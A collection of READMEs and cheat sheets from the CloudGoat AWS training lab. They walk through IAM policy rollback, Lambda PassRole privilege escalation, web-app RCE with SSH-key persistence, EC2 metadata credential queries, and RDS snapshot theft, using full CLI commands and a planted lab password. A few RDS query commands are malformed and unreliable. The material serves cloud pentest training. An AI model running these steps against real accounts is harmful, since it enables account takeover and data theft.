{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md", "content": "# Scenario: iam_privesc_by_rollback\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `./cloudgoat.py create iam_privesc_by_rollback`\n\n## Scenario Resources\n\n- 1 IAM User\n- IAM Policy\n  - 5 policy versions\n\n## Scenario Start(s)\n\n1. IAM User \"Raynor\"\n\n## Scenario Goal(s)\n\nAcquire full admin privileges.\n\n## Summary\n\nStarting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/acef779c-51ce-4582-b4d2-19ae92b7f170/image.png)\n\n## Route Walkthrough - IAM User \"Raynor\"\n\n1. Starting as the IAM user \"Raynor,\" the attacker has only a few limited - seemingly harmless - privileges available to them.\n2. The attacker analyzes Raynor's privileges and notices the SetDefaultPolicyVersion permission - allowing access to 4 other versions of the policy via setting an old version as the default.\n3. After reviewing the old policy versions, the attacker finds that one version in particular offers a full set of admin rights.\n4. Attacker restores the full-admin policy version, gaining full admin privileges and the ability to carry out any malicious actions they wish.\n5. As a final step, the attacker may choose to revert Raynor's policy version back to the original one, thereby concealing their actions and the true capabilities of the IAM user.\n\nA cheat sheet for this route is available [here](./cheat_sheet_raynor.md).", "timestamp": "2025-10-24T11:39:47.898720"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_rollback/cheat_sheet_raynor.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_rollback/cheat_sheet_raynor.md", "content": "### 1. Initial Set-Up \nAfter launching the scenario, you will be provided with an Access Key and Secret. The first step is setting up a profile with the AWS CLI using these credentials.\n\n```bash\naws configure --profile cloudgoat\n\nexport AWS_PROFILE=cloudgoat\n\naws sts get-caller-identity\n# \"Arn\": \"arn:aws:iam::0123456789:user/raynor-iam_privesc_by_rollback_cgidtm8l3zv490\"\n```\n\nThe ARN contains the username in the after `:user/`, it will be unique in each deployment.\nI'll export it as an environment variable to make the cheat sheet clearer. `export IAM_USERNAME=raynor-iam_privesc_by_rollback_cgidtm8l3zv490`\n\n### 2. Policy Enumeration\nOne of the first steps after gaining access to an IAM User is to enumerate the user's privileges in the environment. We can do that by listing the policies attached to the IAM User. \n\n- The first command - `list-user-policies` - are policies embedded directly into the user's IAM identity. \n\n- The second command - `list-attached-user-policies` - are separate, standalone IAM policies - either AWS managed or customer managed policies - that are attached to the user. \n\n```bash\naws iam list-user-policies --user-name $IAM_USERNAME\n# None\n\naws iam list-attached-user-policies --user-name $IAM_USERNAME\n# \"PolicyName\": \"cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490\"\n# \"PolicyArn\": \"arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490\"\n```\nRather than typing out this policy each time, it can be helpful to export it as another enviornmental varible. \n```bash\nexport IAM_POLICY_ARN=arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490`\n```\n### 3. Enumerating Policy Versions\nIn AWS IAM, each policy can have multiple versions - up to five - where only one version is set as the 'default\" (active) version. Whenever you edit a policy, IAM creates a new version, leaving older versions saved in the background. \n\nOlder, non-default versions may grant privileges that are no longer visible in the default version. If an attacker can switch the default to a more permissive version, they could elevate their access. \n\n```bash\naws iam list-policy-versions --policy-arn $IAM_POLICY_ARN\n# Shows five versions\n\naws iam get-policy-version --policy-arn $IAM_POLICY_ARN --version-id v1\n# v1 is the default version, the permissions currently granted to the user\n```\n\nThe policy below is the v1 version, it grants \"read\" access (list & get) as well as the power to switch between versions of policies.\n\n```json\n{\n    \"PolicyVersion\": {\n        \"Document\": {\n            \"Statement\": [\n                {\n                    \"Action\": [\n                        \"iam:Get*\",\n                        \"iam:List*\",\n                        \"iam:SetDefaultPolicyVersion\"\n                    ],\n                    \"Effect\": \"Allow\",\n                    \"Resource\": \"*\"\n                }\n            ]\n        },\n        \"VersionId\": \"v1\",\n        \"IsDefaultVersion\": true\n    }\n}\n```\n\nLooking through the different policy versions `v3` has the following statement.\n\n```json\n{\n    \"PolicyVersion\": {\n        \"Document\": {\n            \"Statement\": [\n                {\n                    \"Action\": \"*\",\n                    \"Effect\": \"Allow\",\n                    \"Resource\": \"*\"\n                }\n            ]\n        },\n        \"VersionId\": \"v3\",\n        \"IsDefaultVersion\": false\n    }\n}\n```\n\nBreaking this apart it grants all actions (`\"Action\": \"*\"`) to all resources. Since the current policy version grants the ability to change versions let switch to use this.\n\n```bash\naws iam set-default-policy-version --policy-arn $IAM_POLICY_ARN --version-id v3\n```\n\nWe now have **administrative permissions** and have completed the CloudGoat scenario!", "timestamp": "2025-10-24T11:39:48.160290"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/lambda_privesc/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/lambda_privesc/README.md", "content": "\n# Scenario: lambda_privesc\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `$ ./cloudgoat.py create lambda_privesc`\n\n## Scenario Resources\n\n- 1 IAM User  \n- 2 IAM Roles  \n\n## Scenario Start(s)\n\n1. IAM User Chris\n\n## Scenario Goal(s)\n\nAcquire full admin privileges.\n\n## Summary\n\nStarting as the IAM user Chris, the attacker discovers that they can assume a role that has full Lambda access and pass role permissions. The attacker can then perform privilege escalation to obtain full admin access.\n\nNote: This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://app.lucidchart.com/publicSegments/view/f1b7a749-dee0-4645-b305-add2a025b9cc/image.png)\n\n\n## Walkthrough - IAM User \"Chris\"\n\n1. Starting as the IAM user \"Chris\",  the attacker analyses their privileges.\n2. The attacker realizes they are able to list and assume IAM roles. There are two interesting IAM roles: lambdaManager and debug.\n3. The attacker looks at the attached policies for the two IAM roles and realizes lambdaManager has full lambda access and pass role permissions and the debug role has full administrator privileges.\n4. The attacker then tries to assume each role but realizes that they only have sufficient privileges to assume the lambdaManager role, and that the debug role can only be assumed by a Lambda function.\n5. The attacker now leverages the lambdaManager role to perform a privilege escalation using a Lambda function.\n6. First, the attacker writes a script that will attach the administrator policy to the IAM user \"Chris\".\n7. Next, using the lambdaManager role, the attacker creates a Lambda function, specifying the code in step 6, and set the lambda execution role to the debug role.\n8. Lastly, using the lambdaManager role, the attacker invokes the Lambda function, causing the administrator policy to be attached to the \"Chris\" user and thus gaining full admin access.\n\nA cheat sheet for this route is available [here](./cheat_sheet_chris.md).\n", "timestamp": "2025-10-24T11:39:49.037245"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/lambda_privesc/cheat_sheet_chris.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/lambda_privesc/cheat_sheet_chris.md", "content": "### 1. Configuring Credentials\nAfter launching the scenario, you will be provided with an Access Key ID and Secret Access Key. Configure these as a profile with the AWS CLI. \n\n```bash \naws configure --profile chris\n``` \n\n### 2. Confirming Credentials\nAfter setting up the profile, it's always a good idea to confirm the credentials. You can do this with the following command: \n\n```bash\naws sts get-caller-identity --profile chris\n```\nThis should provide you with the UserId, Account #, and ARN for the starting user. \n\n\n### 3. Checking Our Permissions \nNow that we have confirmed initial access, we want to see which permissions our user has in the AWS environment. One way we can do this is by seeing if our user has any policies attached or assigned to them. In AWS, a policy is essentially a JSON document that defines what actions (e.g., read, write) are allowed or denied on which resources (e.g., an S3 bucket, an EC2 instance). Policies can be attached to IAM users, groups, and roles to control their permissions and enforce security boundaries.\n\n#### Inline Policies\nLet's first check for inline policies. Inline policies are AWS IAM policies that are embedded directly into a single IAM user, group, or role. Unlike managed policies (which are standalone and can be attached to multiple entities), inline policies exist only for the specific entity they are attached to, so they provide a unique set of permissions that are tightly coupled to that one user, group, or role.\n\n```bash\naws iam list-user-policies --user-name chris-<cloudgoat_id> --profile chris\n```\n\n#### Managed Policies\nWe do not have any inline policies. Let's check for managed policies. Managed policies are standalone IAM policies that are not embedded directly into a single entity. They can be created and administered either by AWS (AWS-managed policies) or by customers themselves (customer-managed policies). These policies can be attached to multiple users, groups, or roles, making them easier to maintain and reuse across different entities in your AWS environment.\n\n```bash\naws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile chris\n```\nGreat, we found a policy! \n\n#### Policy Versions \nPolicy versions let you keep multiple revisions of the same managed policy. You can store up to five versions of a policy at a time, with only one being the default (active) version. This makes it easier to revert to an older version if you need to undo a change or troubleshoot an issue.\n\nWhen performing a penetration test or looking for privilege escalation paths, it‚Äôs important to inspect all versions of a policy because a non-default (inactive) version might contain broader or more permissive privileges than the currently active one. \n\nLet's list all the policy versions for this policy: \n\n```bash\naws iam list-policy-versions --policy-arn [Policy ARN] --profile chris\n```\n\nThere is only only one version - v1. Let's list the specifics of this policy to see what we have access to. \n```bash\naws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris\n```\nThis shows us that our user has access to IAM resources and the ability to assume roles. \n\n### 4. Hunting for Roles\nSince we have the ability to list IAM resources and assume roles, we should see what roles are in the account (and hopefully we can assume one of them!) \n\n```bash\naws iam list-roles --profile chris\n``` \nThere is a cg-lambdaManager role able to be assumed by our user. This is due to the \"Allow\" in place for our user's ARN. \n\nTo assume a role in AWS means to temporarily take on the access permissions associated with that role. It‚Äôs a way for an AWS user or service to gain credentials that allow different or expanded permissions, without permanently attaching those permissions to the primary identity.\n```json\n                \"Version\": \"2012-10-17\",\n                \"Statement\": [\n                    {\n                        \"Effect\": \"Allow\",\n                        \"Principal\": {\n                            \"AWS\": \"arn:aws:iam::703671921227:user/chris-lambda_privesc_cgidydajq393qx\"\n                        },\n                        \"Action\": \"sts:AssumeRole\"\n                    }\n                ]\n```\n\nThere is also a cg-debug role that is able to be assumed by Lambda. If we can assume the Lambda role first, we should be able to then pursue this role. \n```json\n{\n            \"Path\": \"/\",\n            \"RoleName\": \"cg-debug-role-lambda_privesc_cgidydajq393qx\",\n            \"RoleId\": \"AROA2HVQ5NJF4DHIBD2DI\",\n            \"Arn\": \"arn:aws:iam::703671921227:role/cg-debug-role-lambda_privesc_cgidydajq393qx\",\n            \"CreateDate\": \"2025-03-13T15:27:21Z\",\n            \"AssumeRolePolicyDocument\": {\n                \"Version\": \"2012-10-17\",\n                \"Statement\": [\n                    {\n                        \"Effect\": \"Allow\",\n                        \"Principal\": {\n                            \"Service\": \"lambda.amazonaws.com\"\n                        },\n                        \"Action\": \"sts:AssumeRole\"\n                    }\n                ]\n``` \n### 5. Checking Role Permissions \nOur current user has access to IAM Resources, so let's see what permissions these two roles have. \n\n#### cg-lambdaManager\nWe can check the permissions for this role with the following two commands. The first command will provide us with the ARN of the policy. The command will list out the actual permissions attached to the policy ARN. \n```bash\n# Getting the Policy ARN\naws iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_[CloudGoat-ID] --profile chris\n\n# Listing the actual permissions of the policy\naws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris\n```\nThis policy grants unrestricted access to all AWS Lambda operations, meaning the entity can create, modify, delete, and invoke Lambda functions. It also allows the entity to pass any IAM role to Lambda, potentially escalating privileges by attaching a role with higher permissions to a Lambda function.\n\n#### cg-debug\nLet's run the same commands against the cg-debug role to check permissions. \n```bash\n# Getting the Policy ARN\naws iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_[CloudGoat-ID] --profile chris\n```\nWe don't even have to run the second command since the attached policy is `AdministratorAccess`. If we can compromise this role, we can compromise the full account. \n\n### 6. Assuming the cg-LambdaManager Role \nWhen we assume a role, it will generate temporary credentials for us. These credentials will provide us with the same permissions as the role. Let's do that now: \n\n```bash\naws sts assume-role --role-arn [LambdaManager Role ARN] --role-session-name lambdaManager --profile chris\n```\nThis will provide you with the following:\n- Access Key ID\n- Secret Access Key\n- Session Token\n\n#### Adding Credentials to ~/.aws/credentials \nTo use this role, we need to add the information to our ~/.aws/credentials file. You can open this with nano or your favorite text editor, and add it in this format: \n```bash\n[lambdaManager]\naws_access_key_id = ASIA.....\naws_secret_access_key = 5sJu.......\naws_session_token = FwoGZ.....\n```\nFinally, let's confirm we have access to this role: \n```bash\naws sts get-caller-identity --profile lambdaManager\n```\nAs long as everything worked, you should be provided with the UserID, Account, and ARN of this new role. \n\n### 7. Creating a Lambda Function for Privilege Escalation \nSince we have the ability to create Lambda functions, and the Lambda functions are able to assume AdministratorAccess, we can create a LambdaFunction that assigns administrative access to our user. \n\n#### Creating the Lambda Function\nTo create the lambda function, you need to create a file called `lambda_function.py` with the code below. By default, AWS Lambda‚Äôs Python runtime expects the handler in a file named lambda_function.py with a handler function called lambda_handler. \n```python\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    # Adjust the username and policy ARN as needed\n    iam.attach_user_policy(\n        UserName='chris-lambda_privesc_[Cloudgoat ID]',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return \"Policy attached!\"\n```\nThis code defines a Lambda function that uses the AWS SDK for Python (boto3) to attach a specific AWS-managed policy (AdministratorAccess) to the IAM user named chris-lambda_privesc_cgidydajq393qx. In other words, once this function runs, the specified IAM user will have full administrative privileges in the AWS account.\n\n### 8. Creating and Invoking the Function \nFinally, let's create and then invoke the function for privilege escalation! \n\n#### Creating the Function \nTo create the function, we first need to add it to a zip file. \n```bash\nzip -r lambda_function.py.zip lambda_function.py\n```\nLet's actually create the function now with the AWS CLI (p.s. - you don't need to memorize syntax. ChatGPT and Google will come in handy for these kinds of things!) \n```bash\naws lambda create-function --function-name admin_function --runtime python3.9 --role [cg-debug-role arn] --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager --region us-east-1\n```\n#### Invoking the Function\nFinally, let's invoke the function. This should provide our \"chris\" user with administative privileges \n```bash\naws lambda invoke --function-name admin_function out.txt --profile lambdaManager --region us-east-1\n```\n\n### 9. Confirming Privilege Escalation \nLet's check the permissions on our user. If all worked, we should have the AdministratorAccess policy applied! \n```bash\naws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris\n```\n", "timestamp": "2025-10-24T11:39:49.238941"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rce_web_app/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rce_web_app/README.md", "content": "# Scenario: rce_web_app\n\n**Size:** Medium\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create rce_web_app`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * ELB x 1\n  * EC2 x 1\n  * S3 x 3\n  * RDS x 1\n* 2 IAM Users\n\n## Scenario Start(s)\n\n1. IAM User \"Lara\"\n2. IAM User \"McDuck\"\n\n## Scenario Goal(s)\n\nFind a secret stored in the RDS database.\n\n## Summary\n\nStarting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario‚Äôs goal: a highly-secured RDS database instance.\n\nAlternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/1b75f181-4d6e-4ad7-b3fb-56dd54efab66/image.png)\n\n## Route Walkthrough - IAM User ‚ÄúLara‚Äù\n\n1. As the IAM user Lara, the attacker explores the AWS environment and discovers a web application hosted behind a secured Load Balancer.\n2. The attacker then lists S3 buckets, discovering one which contains the logs for the Load Balancer.\n3. While reviewing the contents of the Load Balancer logs, the attacker sees that the web app has a secret admin page.\n4. Upon visiting the secret admin URL, the attacker discovers that the web app is vulnerable to a remote code execution (RCE) attack via a secret parameter embedded in a form.\n5. The attacker leverages this vulnerability to gain shell access on the EC2 instance hosting the web app.\n\n**Branch A**\n\n1. Now working through the EC2 instance (and therefore operating with its role's more expansive permissions), the attacker is able to access a private S3 bucket.\n2. Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.\n3. The attacker then uses the EC2 instance to list and discover the RDS database referenced in the credentials file.\n4. Finally, the attacker is able to access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database!\n\n**Branch B**\n\n1. Struck by sudden inspiration, the attacker queries the EC2 metadata service and discovers the RDS database credentials and address.\n2. The attacker is then able to access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database!\n\nA cheat sheet for this route is available [here](./cheat_sheet_lara.md).\n\n## Route Walkthrough - IAM User ‚ÄúMcDuck‚Äù\n\n1. The attacker explores the AWS environment and discovers they are able to list S3 buckets using their starting keys.\n2. The attacker discovers several S3 buckets, but they are only able to access one of them. Inside that one S3 bucket they find a pair of SSH keys.\n3. The attacker lists EC2 instances and finds the EC2 instance behind the Load Balancer.\n4. The attacker discovers that the SSH keys found in the S3 bucket enable the attacker to log into the EC2 instance.\n5. Now working through the EC2 instance (and therefore operating with its role instead of McDuck's), the attacker is able to discover and access a private S3 bucket.\n7. Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.\n7. The attacker is able to list and discover the RDS database referenced in the credentials file.\n8. The attacker is finally able to access the RDB database using the credentials they found in step 6 and acquire the scenario's goal: the secret text stored in the RDS database.\n\nA cheat sheet for this route is available [here](./cheat_sheet_mcduck.md).", "timestamp": "2025-10-24T11:39:50.047629"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rce_web_app/assets/db.txt", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rce_web_app/assets/db.txt", "content": "Dear Tomas - For the LAST TIME, here are the database credentials. Save them to your password manager, and delete this file when you've done so! This is definitely in breach of our security policies!!!!\n\nDB name: cloudgoat\nUsername: cgadmin\nPassword: Purplepwny2029\n\nSincerely,\nLara", "timestamp": "2025-10-24T11:39:50.497790"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_lara.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_lara.md", "content": "`aws configure --profile Lara`\n\n`aws s3 ls --profile Lara`\n\n`aws s3 ls s3://<bucket> --recursive --profile Lara`\n\n`aws s3 cp s3://<bucket>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara`\n\n`cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log`\n\n`aws elbv2 describe-load-balancers --profile Lara`\n\n`ssh-keygen -t ed25519` (An ed25519 key pair may be necessary here because using an RSA public key can get truncated in the RCE)\n\n`echo \"public ssh key\" >> /home/ubuntu/.ssh/authorized_keys`\n\n`curl ifconfig.me`\n\n`ssh -i private_key ubuntu@public.ip.of.ec2`\n\n# BRANCH A:\n\n`sudo apt-get install awscli`\n\n`aws s3 ls`\n\n`aws s3 ls s3://<bucket> --recursive`\n\n`aws s3 cp s3://<bucket>/db.txt .`\n\n`cat db.txt`\n\n`aws rds describe-db-instances --region us-east-1`\n\n`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`\n\n`\\dt`\n\n`select * from sensitive_information;`\n\n# BRANCH B:\n\n`curl http://169.254.169.254/latest/user-data`\n\n`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`\n", "timestamp": "2025-10-24T11:39:50.893267"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_mcduck.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_mcduck.md", "content": "`aws configure --profile McDuck`\n\n`aws s3 ls --profile McDuck`\n\n`aws s3 ls s3://<bucket> --recursive --profile McDuck`\n\n`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile McDuck`\n\n`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile McDuck`\n\n`aws ec2 describe-instances --profile McDuck`\n\n`chmod 400 cloudgoat`\n\n`ssh -i cloudgoat ubuntu@<ec2_ip>\n\n`sudo apt-get install awscli`\n\n`aws s3 ls`\n\n`aws s3 ls s3://<bucket> --recursive`\n\n`aws s3 cp s3://<bucket>/db.txt .`\n\n`cat db.txt`\n\n`aws rds describe-db-instances --region us-east-1`\n\n`psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat`\n\n`\\dt`\n\n`select * from sensitive_information;`\n", "timestamp": "2025-10-24T11:39:51.027602"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rds_snapshot/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rds_snapshot/README.md", "content": "# Scenario: RDS_snapshot\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `$ ./cloudgoat.py create RDS_snapshot`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * EC2 x 1\n  * S3 x 1\n  * RDS x 1\n* 1 IAM Users\n\n## Scenario Start(s)\n\n1. IAM User \"David\"\n\n## Scenario Goal(s)\n\nGet the flags that are included in the RDS snapshot.\n\n## Summary\n\n\nStarting with access to EC2, the user can leverage the privileges of the EC2 instance to steal credentials from S3. \n\nWith the stolen credentials, the attacker can gain RDS Snapshot restore privileges, which will allow them to access the DB and retrieve flags.\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://github.com/RhinoSecurityLabs/cloudgoat/assets/55736240/bff418b2-f656-4851-9f8d-00288c66e3fa)\n\n\n\n\n## Route Walkthrough - IAM User ‚ÄúDavid‚Äù\n\n1. the attacker gains access to the hijacked EC2 instance.\n2. The attacker accesses S3 on the compromised EC2 instance and retrieves credentials.\n3. The attacker uses the stolen credentials to locate and access the AWS Relational Database Service (RDS).\n4. The attacker verifies that an RDS snapshot exists.\n5. The attacker restores the RDS snapshot and hijacks the DB containing customer data (Flag).\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).", "timestamp": "2025-10-24T11:39:51.692630"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/rds_snapshot/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rds_snapshot/cheat_sheet.md", "content": "## Cheat Sheet\n\n\nAn attacker can gain access to a hijacked EC2 instance.\n\n\n`cd RDS_Snapshot_cgid528tilly5h`\n\n\n`ssh ec2-user@54.242.220.178 -i ./cloudgoat`\n\n\n```\n[ubuntu@ip-172-31-20-221 ~]$\n```\n\n\nAn attacker can list AWS credentials on the server (enumirate)\n\n\n`aws sts get-caller-identity`\n\n\nThe attacker can check the permissions for the roles granted on EC2.\n\n\n```\n#Check the instance profiles\naws iam list-instance-profiles\n\naws iam list-role-policies --role-name cg-ec2-admin-role\n\naws iam get-role-policy --role-name cg-ec2-admin-role --policy-name cg-ec2-admin-policy\n```\n\n\nThe attacker sees that S3 is accessible and steals the credentials.\n```\naws s3 ls\n\naws s3 cp s3://cloudgoat/access_keys.txt .\n```\nThe attacker accesses the stolen credentials.\n```\naws configure --profile david\n```\nThe attacker checks the permissions of the stolen credentials.\n```\naws iam get-user --profile david\n\n\naws iam list-user-policies --user-name cg-rds-instance-user-RDS_Snapshot_cgidy7ybygks75 --profile david\n\n\naws iam get-user-policy --user-name cg-rds-instance-user-RDS_Snapshot_cgidy7ybygks75 --policy-name cg-david-policy --profile david\n\n\n# The attacker verifies that he has RDS-related privileges\n```\n\nThe attacker restores the RDS snapshot.\n\n```\n#Verify the information in the RDS snapshot\naws rds describe-db-instances --profile david\n\naws rds describe-db-snapshots --db-instance-identifier cg-rds\n\n\n#Restore the RDS snapshot\naws rds restore-db-instance-from-db-snapshot \\\n    --db-instance-identifier attack-rds \\\n    --db-snapshot-identifier cg-rds-snapshot \\\n    --db-subnet-group-name cg-db-subnet-group \\\n    --vpc-security-group-ids sg-xxxxxxxxxxxxxxxxx \\\n    --profile david\n\n\n#Wait for a new instance to be created\n\n\n#Modify the RDS instance password\naws rds modify-db-instance \\\n    --db-instance-identifier attack-rds \\\n    --master-user-password attack1234! \\\n    --apply-immediately \\\n    --profile david\n\n\n#Verify the master username\naws rds describe-db-instances --db-instance-identifier attack-rds --query \\ \"DBInstances[.1].1\n\"DBInstances[].MasterUsername\" --profile david\n\n\n#Determine the MySQL endpoint address\naws rds describe-db-instances --db-instance-identifier attack-rds --query \\ \"DBInstances[.\n\"DBInstances[].Endpoint.Address\" --profile david\n\n\n```\n\n\nThe attacker accesses the restored DB and hijacks the FLAG.\n```\nmysql -h attack-rds.cxxxxxxxxxxx.us-east-1.rds.amazonaws.com -P 3306 -u cgadmin -pattack1234!\nshow databases;\nuse mydatabase;\nshow tables;\nselect * from flag;\n```\n# Caveats\nAt the end of the scenario, the instance created by the Restore job is not deleted by ./cloudgoat.py destroy rds_snapshot. You need to delete it manually.\n", "timestamp": "2025-10-24T11:39:52.162498"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/scenario_template/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/scenario_template/README.md", "content": "# Scenario: [SCENARIO_NAME]\n\n**Size:** Small/Medium/Large\n\n**Difficulty:** Easy/Moderate/Hard\n\n**Command:** `./cloudgoat.py create [SCENARIO_NAME]`\n\n## Scenario Resources\n\n- 1 [RESOURCE_TYPE]\n- 1 [RESOURCE_TYPE]\n- 1 [RESOURCE_TYPE]\n- 1 [RESOURCE_TYPE]\n- 1 [RESOURCE_TYPE]\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key\n\n## Scenario Goal(s)\n\n[SCENARIO_GOAL]\n\n## Summary\n\nIn this scenario, you are given AWS credentials. Your task is to...\n\n## Exploitation Route\n\nA flowchart illustrating the routes the attacker may take when completing the scenario. Lucidchart is recommended.\n\n![Scenario Route(s)](https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg)\n\n## Walkthrough - [SERVICE] Secrets\n\nInclude a high level overview of the attack path here. \n\n1. Start by...\n2. ...\n3. ...\n4. ...\n5. ...\n6. ...\n7. ...\n8. ...\n\nA detailed cheat sheet & walkthrough for this route is available [here](./cheat_sheet.md). \n", "timestamp": "2025-10-24T11:39:52.745469"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/scenario_template/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/scenario_template/cheat_sheet.md", "content": "# [SCENARIO NAME] Walkthrough\n\n## Summary\n\nIn this scenario, you are provided with.... You need to enumerate... Then, use the ... Finally, do this to get the final flag. \n\n## Detailed Walkthrough\n\nThe purpose of CloudGoat is to help people learn AWS Pentesting. Provide a detailed walkthrough for the scenario with this goal in mind. A good example to refer to is the walkthrough for the [SNS Secrets scenario](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/sns_secrets/cheat_sheet.md)\n", "timestamp": "2025-10-24T11:39:52.892053"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md", "content": "# Scenario: secrets_in_the_cloud\r\n\r\n**Size:** Large\r\n\r\n**Difficulty:** Hard\r\n\r\n**Command:** `$ ./cloudgoat.py create secrets_in_the_cloud`\r\n\r\n## Resources\r\n\r\n* 1 Lambda\r\n* 1 EC2\r\n* 1 S3\r\n* 1 DynamoDB\r\n* 1 Secrets Manager Secret\r\n* 2 IAM Users\r\n\r\n## Start\r\n\r\n1. IAM User: low-priv-user\r\n\r\n## Goal\r\n\r\nFind the final secret in Secrets Manager.\r\n\r\n## Summary\r\n\r\nAs an IAM user with limited privileges, the attacker initiates their journey by examining AWS resources to uncover clues and hidden information. This investigation ultimately results in acquiring a role that grants access to the scenario's primary objective: retrieving the final secret from Secrets Manager. Please note that this walkthrough outlines the intended path for completing the scenario. However, alternative approaches may exist, and we would be delighted to learn about any unique methods used to reach the finish line.\r\n\r\n## Path\r\n\r\n![Path](./path.png)\r\n\r\n## Walkthrough\r\n\r\n1. As the IAM user \"low-priv-user\", the attacker explores the AWS environment, discovering an S3 bucket containing the URL to a web application hosted on an EC2 instance.\r\n2. The attacker enumerates the web application and uncovers an admin page that prompts for an API key.\r\n3. While examining the admin page's HTML comments, the 